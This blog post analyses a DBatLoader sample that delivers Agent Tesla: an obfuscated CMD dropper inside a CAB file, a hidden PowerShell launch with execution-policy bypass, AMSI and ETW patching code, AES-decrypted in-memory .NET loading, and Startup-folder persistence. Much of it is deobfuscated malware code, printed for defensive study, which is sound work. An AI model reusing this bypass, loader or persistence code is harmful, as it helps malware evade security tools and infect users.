---
layout: post
---

[back](./)

# DBatloader delivering Agent Tesla

While reading up on malware news, I came across this post by asec: https://asec.ahnlab.com/en/85834/ that describes a campaign involving distribution of a malware using batch files packaged into a MS CAB file. This malware was known as DBATLoader and the CAB file header it was packaged in was modified to bypass security controls.

I'll be analysing one such sample on Virustotal: https://www.virustotal.com/gui/file/ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d.  SHA256: ee945aefb2643f4de44a80b9f1c6c7b8b8a854ee8dd83d952b910867c2c72c8d 

## Analysis of CMD file
Using 7-zip to open the CAB file, a CMD file, a png file and a text file is packaged in. The text file contains nothing of interests and the png file appears to be an invoice which is used to provide legitimacy to the package. 

![invoice](/assets/images/dbat_tesla/invoice.png)

The CMD file appears to be the click bait for the victim, so I'll start the analysis from there. On first glance, its pretty clear the CMD file is heavily obfuscated.

```cmd
%ogj%@%ogj%e%ogj%c%ogj%h%ogj%o%ogj% %ogj%o%ogj%f%ogj%f%ogj%
if not DEFINED tqlpfujzeixzvrqRzKvtqlpfujzeixzvrq set tqlpfujzeixzvrqRzKvtqlpfujzeixzvrq=1 && start "" /min "%~dpnx0" %* && exit
%tqlpfujzeixzvrq%s%tqlpfujzeixzvrq%e%tqlpfujzeixzvrq%t%tqlpfujzeixzvrq% "%tqlpfujzeixzvrq%s%tqlpfujzeixzvrq%o%tqlpfujzeixzvrq%u%tqlpfujzeixzvrq%r%tqlpfujzeixzvrq%c%tqlpfujzeixzvrq%e%tqlpfujzeixzvrq%F%tqlpfujzeixzvrq%i%tqlpfujzeixzvrq%l%tqlpfujzeixzvrq%e%tqlpfujzeixzvrq%=%~dp0%~nx0"
%mcyvisromengtcs%c%mcyvisromengtcs%o%mcyvisromengtcs%p%mcyvisromengtcs%y%mcyvisromengtcs% "%sourceFile%" "%userprofile%\%mcyvisromengtcs%d%mcyvisromengtcs%w%mcyvisromengtcs%m%mcyvisromengtcs%.%mcyvisromengtcs%b%mcyvisromengtcs%a%mcyvisromengtcs%t%mcyvisromengtcs%" >nul"
%aumuk%s%aumuk%e%aumuk%t%aumuk%l%aumuk%o%aumuk%c%aumuk%a%aumuk%l%aumuk% %aumuk%e%aumuk%n%aumuk%a%aumuk%b%aumuk%l%aumuk%e%aumuk%d%aumuk%e%aumuk%l%aumuk%a%aumuk%y%aumuk%e%aumuk%d%aumuk%e%aumuk%x%aumuk%p%aumuk%a%aumuk%n%aumuk%s%aumuk%i%aumuk%o%aumuk%n%aumuk%
%cxckr%s%cxckr%e%cxckr%t%cxckr% "waznb=s"
%rwwjy%s%rwwjy%e%rwwjy%t%rwwjy% "sdsxv=t"
%wilBq%s%wilBq%e%wilBq%t%wilBq% "cdncd=!waznb!e!sdsxv!"
!cdncd! "%nih%y%nih%v%nih%n%nih%d=([Convert]::FromBase6"
!cdncd! "%vjf%c%vjf%k%vjf%a%vjf%p=TskeGd0dXIgPSAiQzpcVX"
!cdncd! "%kyy%b%kyy%t%kyy%z%kyy%n=dmFyKXsJJGRwbWppPVtTe"
!cdncd! "%ixt%l%ixt%a%ixt%g%ixt%p=XTo6RnJvbUJhc2U2NFN0c"
!cdncd! "%ggu%y%ggu%w%ggu%y%ggu%h=c2FxLkNvcHlUbygkemdrb"
!cdncd! "%pbo%k%pbo%m%pbo%w%pbo%y=gpOwkkYWVzX3Zhci5Nb2R"
!cdncd! "%snc%n%snc%y%snc%i%snc%i=EZWNvbXByZXNzKTsJJHRx"
!cdncd! "%sei%z%sei%q%sei%e%sei%t=mluZygkeHN6bmhbMV0pKS"
!cdncd! "%tbt%l%tbt%k%tbt%u%tbt%x=ICAgICAgICAgICRpbmplY"
!cdncd! "%gii%q%gii%d%gii%n%gii%z=nVuY3Rpb24gaWltcXooJH"
!cdncd! "%nnf%m%nnf%q%nnf%k%nnf%a=lPVtTeXN0ZW0uU2VjdXJp"
!cdncd! "%jla%l%jla%z%jla%b%jla%v=GRlY3J5cHRvcl92YXIuVH"
...
```

There is also two large blob of what appears to be obfuscated data. One prefixed with "::*space*" and the other ":::".

```cmd
...
!cdncd! "%yls%n%yls%q%yls%x%yls%l=le hidden -ep bypass "
:: boQq3l4dlMdFpQojxjSve1u3lvlGR0lQm7O7tSLEFqo8ChFyIYCwQn5rVlwsWPB8CI09UmW6Jjxmxi/3hKFqMKiwa7w3KocZpQIUmUJc/lof6zTqHuSUM6lOEGzXPW/i0/MQNr1UA7Lqd4aZPIxWAsXeqAxISZMdOP55yovNcrYl+vwT2DazKf6wiZrOdPz+6AtjZaDY14D+m6V2nZ5/KDSagtbqj3sLbO3ZQR56ibqbxnUrk7HuGaudj1XvQT6Wao0sFbzHw8CbHQME5E2MHwvhh48T7tmNmvZbQSG8CAQb5z0xATsia0CoAUgA0WB35w64D7JKk6aDaOk4CotfsY13BVrjDk25k27AePNH5eCxKyLKQtkqhjA+OcrdJjXo+jgab1FsahiQ+LO7wO0HC3y9atGL5Kmt9eezOhWqPAFTMt1koT2RfdrsJBPVbz3kA71lpC9rSkiMBRfeuzidgI2LiIZubUn4a8nLxp6FIqiaTltHoJej9lwRqFSJTcRvfBqAoQPW8lFsX3qP3LJfsKtejh2sOgdRDPNzOOjdiUMCCNsETNCHx6nZPukdcdhADRKXbB/8DZQKHTuZSOpehKXC8HOafeC5TwpKEKZLxJql2JbMn7Mw2qPJNK+uokZDsPnmrRmmwBJeXMYhndz0RBNXWwz3bB6234VARsm9NqvTF7wS68h91KBfuBwF8Qeg32M7gmzDrsU9TsmUskOnKJd3dnLc/A+w7mR4uZdKdd11tHFlswV8oRiGTuffgNVmTUxqw0pSlOfKtl6+1bsdF5JZiA2cFen1JPjxZA7Nyssk9Ksxan4pUNVAsAqMfDsieM0wKT66m4pP9PD9f5tmD3KkO7sQakf7qujGSKXTEGqlZwEAy9ZPI4m
...
```

```cmd
...
:::ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBTAHkAcwBSAG8AdQB0AGkAbgBlACAAewANAAoAIAAgACAAIABbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0ADQAKACAAIAAgACAAcABhAHIAYQBtACAAKAANAAoAIAAgACAAIAAgACAAIAAgAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQA9ACQAZgBhAGwAcwBlACwAIABQAG8AcwBpAHQAaQBvAG4APQAwACkAXQANAAoAIAAgACAAIAAgACAAIAAgAFsAcwB3AGkAdABjAGgAXQAkAFYAZQByAGIAbwBzAGUARgBsAGEAZwAsAA0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5AD0AJABmAGEAbABzAGUALAAgAFAAbwBzAGkAdABpAG8AbgA9ADAAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAWwBzAHcAaQB0AGMAaABdACQARABpAHMAYQBiAGwAZQBTAHYAYwANAAoAIAAgACAAIAApAA0ACgANAAoAIAAgACAAIABpAGYAIAAoACQAVgBlAHIAYgBvAHMAZQBGAGwAYQBnACkAIAB7ACAAJABWAGUAcgBiAG8AcwBlAFAAcgBlAGYAZQByAGUAbgBjAGUAIAA9ACAAIgBDAG8AbgB0AGkAbgB1AGUAIgAgAH0ADQAKAA0ACgAgACAAIAAgAHQAcgB5ACAAewANAAoAIAAgACAAIAAgACAAIAAgAGYAdQBuAGMAdABpAG8AbgAgAEcAZQB0AC0AUwB5AHMARgB1AG4AYwBBAGQAZAByACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcABhAHIAYQBtACAAKABbAHMAdAByAGkAbgBnAF0AJABNAG8AZABJAEQALAAgAFsAcwB0AHIAaQBuAGcAXQAkAEYAdQBuAGMASQBEACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbQBvAGQASABhAG4AZABsAGUAIAA9ACAAJABOAGEAdABpAHYAZQBfAEcAZQB0AE0AbwBkAHUAbABlAEgAYQBuAGQAbABlAC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgAEAAKAAkAE0AbwBkAEkARAApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAdABlAG0AcABQAHQAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBuAHQAUAB0AHIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaABhAG4AZABsAGUAUgBlAGYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ASABhAG4AZABsAGUAUgBlAGYAKAAkAHQAZQBtAHAAUAB0AHIALAAgACQAbQBvAGQASABhAG4AZABsAGUAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABOAGEAdABpAHYAZQBfAEcAZQB0AEEAZABkAHIAZQBzAHMALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsA
...
```

After deobfuscation, the cmd file looks something like this:
```cmd
@echo off
set tqlpfujzeixzvrqRzKvtqlpfujzeixzvrq=1 && start "" /min "%~dpnx0" %* && exit
set "sourceFile=%~dp0%~nx0"
copy "%sourceFile%" "%userprofile%\dwm.bat" >nul"
setlocal enabledelayedexpansion

set "yvnd=([Convert]::FromBase6"
set "ckap=TskeGd0dXIgPSAiQzpcVX"
set "btzn=dmFyKXsJJGRwbWppPVtTe"
set "lagp=XTo6RnJvbUJhc2U2NFN0c"
set "ywyh=c2FxLkNvcHlUbygkemdrb"
set "kmwy=gpOwkkYWVzX3Zhci5Nb2R"
set "nyii=EZWNvbXByZXNzKTsJJHRx"
set "zqet=mluZygkeHN6bmhbMV0pKS"
set "lkux=ICAgICAgICAgICRpbmplY"
set "qdnz=nVuY3Rpb24gaWltcXooJH"
set "mqka=lPVtTeXN0ZW0uU2VjdXJp"
...
```

"sourceFile" is set to the full path of the CMD file. A copy instruction is used to copy the CMD file to the %userprofile% directory and renamed to "dwm.bat". Further down the deobfuscated script, commands are concantenated from environment variables set before.

```cmd
%diai%%psbo%%egrp%%muwb%%syfy%%zfmt%%hfsd%%occb%%nqxl%%agno%%rwue%%yvnd%%siaz%%bzlc%%ckap%%fixk%%ujhl%%xmph%%xjcs%%lmof%%adop%%pdqo%%xlhv%%yusd%%wtge%%jbsn%%gmef%%bgjh%%jwla%%jkje%%kohj%%ioyc%%nwxv%%ehnq%%buae%%rbxw%%hmxr%%nlji%%gusk%%txxs%%uzyo%%vpyk%%jrwy%%hels%%oayg%%lkux%%etat%%gbuj%%vnwb%%paey%%gbbw%%klyq%%yexb%%xywl%%twvw%%zsmo%%bxkb%%vhwi%%dfld%%pdue%%mkmf%%amjv%%oynk%%nbks%%upxm%%wkcr%%sbhl%%egtk%%ibnz%%wljr%%oltg%%zdhi%%jebb%%ipsm%%pyth%%vzei%%ygqn%%hhqt%%vbtf%%enaw%%extb%%jbzd%%qdnz%%ykcq%%sqrv%%kwsy%%zuco%%kmwy%%mqka%%lhho%%gvbf%%pacq%%duwe%%ghxu%%nuag%%rvty%%pijf%%nlkw%%ndki%%gbkc%%zdfm%%zopw%%iqjq%
```

Further work on deobfuscating this reveals a powershell command. A base64 encoded string is decoded and invoked. 

```ps1
"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -noprofile -windowstyle hidden -ep bypass  -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHVzZXJOYW1lID0gJGVudjpVU0VSTkFNRTskeGd0dXIgPSAiQzpcVXNlcnNcJHVzZXJOYW1lXGR3bS5iYXQiO2lmIChUZXN0LVBhdGggJHhndHVyKSB7ICAgIFdyaXRlLUhvc3QgIkJhdGNoIGZpbGUgZm91bmQ6ICR4Z3R1ciIgLUZvcmVncm91bmRDb2xvciBDeWFuOyAgICAkZmlsZUxpbmVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbExpbmVzKCR4Z3R1ciwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOCk7ICAgIGZvcmVhY2ggKCRsaW5lIGluICRmaWxlTGluZXMpIHsgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ146OjogPyguKykkJykgeyAgICAgICAgICAgIFdyaXRlLUhvc3QgIkluamVjdGl....) | Invoke-Expression"
```

## Analysis of Powershell command (1/2)

Decoding the powershell command and focusing on the key functions:

A regular expression is used to extract a line that matches with '^::: ?(.+)$'. The values after it are base64 decoded and invoked. This is the second data blob described earlier.

```ps1
foreach ($line in $fileLines) {        
		if ($line -match '^::: ?(.+)$') {            
			Write-Host "Injection code detected in the batch file." -ForegroundColor Cyan;           
			try {                
				$decodedBytes = [System.Convert]::FromBase64String($matches[1].Trim());                
				$injectionCode = [System.Text.Encoding]::Unicode.GetString($decodedBytes);                
				Write-Host "Injection code decoded successfully." -ForegroundColor Green;                
				Write-Host "Executing injection code..." -ForegroundColor Yellow;    
				Invoke-Expression $injectionCode;                
				break;            
			} catch {                
				Write-Host "Error during decoding or executing injection code: $_" -ForegroundColor Red;            
			};
		};    
	};
```

### Data Blob #2

Decoding the data blob shows another powershell script.

The byte arrays when converted from byte array are:
- GetProcAddress
- GetModuleHandle
- AmsiInitialize
- amsi.dll


```ps1
$NativeMethods = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
$bytesGetProc = [Byte[]](0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73)
$bytesGetMod  = [Byte[]](0x47,0x65,0x74,0x4D,0x6F,0x64,0x75,0x6C,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65)
$getProcName = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
$getModName  = [System.Text.Encoding]::ASCII.GetString($bytesGetMod)
$Native_GetModuleHandle = $NativeMethods.GetMethod($getModName) //GetModuleHandle
$Native_GetAddress = $NativeMethods.GetMethod($getProcName) //GetProcAddress
$bytesInit = [Byte[]](0x41,0x6D,0x73,0x69,0x49,0x6E,0x69,0x74,0x69,0x61,0x6C,0x69,0x7A,0x65)
$bytesLib  = [Byte[]](0x61,0x6d,0x73,0x69,0x2e,0x64,0x6c,0x6c)
$libMod    = [System.Text.Encoding]::ASCII.GetString($bytesLib) //amsi.dll
$initFunc  = [System.Text.Encoding]::ASCII.GetString($bytesInit) //AmsiInitialize
$initAddr = Get-SysFuncAddr $libMod $initFunc
```

AmsiInitialize from amsi.dll is invoked and the pointer to the function address is saved in "initAddr". 
```ps1
function Get-SysFuncAddr {
            param ([string]$ModID, [string]$FuncID)
            $modHandle = $Native_GetModuleHandle.Invoke($null, @($ModID))
            $tempPtr = New-Object IntPtr
            $handleRef = New-Object System.Runtime.InteropServices.HandleRef($tempPtr, $modHandle)
            $Native_GetAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$handleRef, $FuncID))
        }
```

"initDelegate" now points to the AmsiInitialize function
```ps1
if ($ptrSize -eq 8) {
            $initDelegate = Get-SysDelegate $initAddr @([string], [UInt64].MakeByRefType()) ([Int])
            [Int64]$sysContext = 0
}
        else {
            $initDelegate = Get-SysDelegate $initAddr @([string], [IntPtr].MakeByRefType()) ([Int])
            $sysContext = 0
}
```
"protDelegate" points to VirualProtect
```ps1
$protSuffix = 'Virt' + 'ualProtec'
$protMethod = '{0}{1}' -f $protSuffix, 't'
$kernelMod  = "ker{0}.dll" -f "nel32"
$protAddr   = Get-SysFuncAddr $kernelMod $protMethod
$protDelegate = Get-SysDelegate $protAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
```
The rest of the script basically makes use of AmsiInitialize and VirtualProtect to patch all the scan functions; it sets eax register to zero and calls ret instruction.

The technique is described as "Scanning Interception": https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

The second part of the decrypted data blob patches EtwEventWrite to ret instruction 
```ps1
if ($DisableSvc) {
            $bytesSvc = [Byte[]](0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65)
            $svcName  = [System.Text.Encoding]::ASCII.GetString($bytesSvc)
            $svcAddr  = Get-SysFuncAddr ("nt{0}.dll" -f "dll") $svcName
            if (-not $protDelegate.Invoke($svcAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$origProt)) {
                Throw "[!] Error changing memory protection of $svcName"
            }
            try {
                if ($ptrSize -eq 8) {
                    $SysMarshal::WriteByte($svcAddr, 0xC3)
                }
                else {
                    $svcPatch = [byte[]](0xb8,0xff,0x55)
                    $SysMarshal::Copy($svcPatch, 0, [IntPtr]$svcAddr, 3)
                }
            } 		
```

The purpose of the data blob is to bypass AMSI protection.

## Analysis of Powershell command (2/2)
Swifting the focus back to the powershell command, following the bypassing of AMSI, the first data blob identified earlier is parsed.

```ps1
foreach ($jwy in $psgyt) {	
	if ($jwy.StartsWith(':: '))	{		
		$sbtdn=$jwy.Substring(3);		
		break;	
	}
}
```

The blob is split by the '\\' character and each split is base64 decoded. Each result is then AES decrypted and decompressed as seen below.

```ps1
function peffm($param_var){	
	$vwwns=New-Object System.IO.MemoryStream(,$param_var);	
	$zgklv=New-Object System.IO.MemoryStream;	
	$tqsaq=New-Object System.IO.Compression.GZipStream($vwwns, [IO.Compression.CompressionMode]::Decompress);	
	$tqsaq.CopyTo($zgklv);	
	$tqsaq.Dispose();	
	$vwwns.Dispose();	
	$zgklv.Dispose();	
	$zgklv.ToArray();
}

function iimqz($param_var){	
	$aes_var=[System.Security.Cryptography.Aes]::Create();
	$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$aes_var.Key=[System.Convert]::FromBase64String('JEYdhFF6l4V8XD6bX1BylT2WkHbF+rhQXeWGHIn1v8s=');	
	$aes_var.IV=[System.Convert]::FromBase64String('6onCkC0htRDZjgLvN5Itnw==');	
	$decryptor_var=$aes_var.CreateDecryptor();	
	$return_var=$decryptor_var.TransformFinalBlock($param_var, 0, $param_var.Length);	
	$decryptor_var.Dispose();	
	$aes_var.Dispose();	
	$return_var;
}

$xsznh=[string[]]$sbtdn.Split('\');
$knfzb=peffm (iimqz ([Convert]::FromBase64String($xsznh[0])));
$daywm=peffm (iimqz ([Convert]::FromBase64String($xsznh[1])));
```

The results are loaded into the Powershell process and executed.

```ps1
function paqoc($param_var,$param2_var){	
	$dpmji=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$param_var);	
	$lvivv=$dpmji.EntryPoint;	
	$lvivv.Invoke($null, $param2_var);
}

paqoc $knfzb $null;
paqoc $daywm (,[string[]] ('%*'));
```

### Data Blob #1

Using cyberchef, two PE files were extracted from the split result on the data blob. 
![cyberchef_1](/assets/images/dbat_tesla/cyberchef_1.png)

Both files are .NET binaries.

## .NET File #1
The first .NET file executed contains no code at all. It is most likely used as a distraction to the analyst.
![pe1](/assets/images/dbat_tesla/pe1.png)

## .NET File #2
The second .NET file contains code that seems to be setting up persistence and patching AMSI. 
![pe2](/assets/images/dbat_tesla/pe2.png)

Persistence is established by copying the CMD file to the startup folder with the name "StartupScript_{0}" where "{0}" is a GUID value with 8 characters long.
```C#
string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
if (!Directory.Exists(folderPath))
{
	Directory.CreateDirectory(folderPath);
}
string path = string.Format("StartupScript_{0}.cmd", Guid.NewGuid().ToString().Substring(0, 8));
string text = Path.Combine(folderPath, path);
if (!string.Equals(Path.GetFullPath(batPath), Path.GetFullPath(text), StringComparison.OrdinalIgnoreCase))
{
	File.Copy(batPath, text, true);
}
```

An encrypted PE file named "xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe" is embedded in the resource section of the .NET file extracted and decrypted.
```C#
string text = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx.exe";
Assembly executingAssembly = Assembly.GetExecutingAssembly();
string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
...
if (!(name == text) && !string.IsNullOrWhiteSpace(name)) 
...
byte[] rawAssembly = dxfqj.ukvrh(dxfqj.pycwb(dxfqj.izgjq(text), Convert.FromBase64String("o11kLD0EAtXh58eYbcD9wY8VE98TwNxCYsZa2Ijexyk="), Convert.FromBase64String("u3kwLF5bU1pOT8jXty3EQA==")));
```

It is loaded and invoked.
```C#
MethodInfo entryPoint = Assembly.Load(rawAssembly).EntryPoint;
...
entryPoint.Invoke(null, new object[]
```

The decrypted PE file can be retrieved using the same Cyberchef recipe described before. This shows it to be yet another .NET file, making it the 3rd .NET file to be analysed.

## .NET File #3
The code is heavily obfuscated.
![pe3](/assets/images/dbat_tesla/pe3.png)


https://ryan-weil.github.io/posts/AGENT-TESLA-2/
